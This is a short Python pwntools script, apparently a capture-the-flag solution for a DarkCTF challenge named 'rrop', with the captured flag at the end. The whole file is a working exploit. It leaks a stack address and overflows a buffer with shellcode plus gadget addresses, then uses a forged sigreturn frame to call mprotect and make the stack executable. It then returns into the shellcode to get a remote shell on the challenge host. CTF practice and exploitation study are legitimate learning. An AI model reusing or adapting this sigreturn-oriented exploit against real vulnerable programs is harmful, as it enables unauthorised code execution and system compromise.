from pwn import *

context.clear(arch="amd64")
c = remote('rrop.darkarmy.xyz', 7001)
pad = 0xd8

# ENTRIES
syscall_ret = 0x00000000004007D2
mov_rax_15_ret = 0x00000000004007DC

# LEAK
c.recvuntil("@0x")
leak = int(c.recvuntil(",")[:-1], 16)
print("Buff @ " + hex(leak))

shellcode = asm(shellcraft.sh())

payload = shellcode  # PLACING SHELLCODE IN BEGINNING OF BUFF
payload = payload.ljust(pad, b'A')  # FILLING STACK TO SAVED RIP
payload += p64(mov_rax_15_ret)  # SET RAX TO SIGRETURN SYSCALL NUMBER
payload += p64(syscall_ret)  # CALL SIGRETURN
# BUILD FAKE FRAME
frame = SigreturnFrame(kernel="amd64")  # CREATING A SIGRETURN FRAME
frame.rax = 10  # SET RAX TO MPROTECT SYSCALL NUMBER
frame.rdi = leak & ~(0xfff)  # SET RDI TO BUFF ADDRESS
frame.rsi = 2000  # SET RSI TO SIZE
frame.rdx = 7  # SET RDX => RWX PERMISSION
frame.rsp = leak + len(payload) + 248  # WHERE 248 IS SIZE OF FAKE FRAME, CAUSE WE STILL NEED TO CONTROL RIP AFTER!
frame.rip = syscall_ret  # SET RIP TO SYSCALL ADDRESS
# PLACE FAKE FRAME IN STACK
payload += bytes(frame)
payload += p64(leak)  # RETURN2SHELLCODE


c.sendline(payload)
c.interactive()

# darkCTF{f1n4lly_y0u_f4k3_s1gn4l_fr4m3_4nd_w0n_gr4n173_w1r3d_m4ch1n3}
